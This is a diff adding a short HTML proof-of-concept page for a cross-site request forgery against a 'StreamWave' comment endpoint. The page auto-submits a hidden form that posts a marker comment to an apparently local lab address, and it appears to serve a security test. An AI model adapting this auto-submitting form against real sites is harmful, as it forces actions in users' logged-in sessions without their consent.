@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC - StreamWave comment</title></head>
+<body>
+  <p>Enviando comentario forzado via CSRF...</p>
+  <form id="csrf" action="http://172.17.0.2:9090/watch/xyt459/comment" method="POST">
+    <input type="hidden" name="body" value="CSRF-POC-forzado-sin-mi-cuenta">
+  </form>
+  <script>document.getElementById('csrf').submit()</script>
+</body>
+</html>
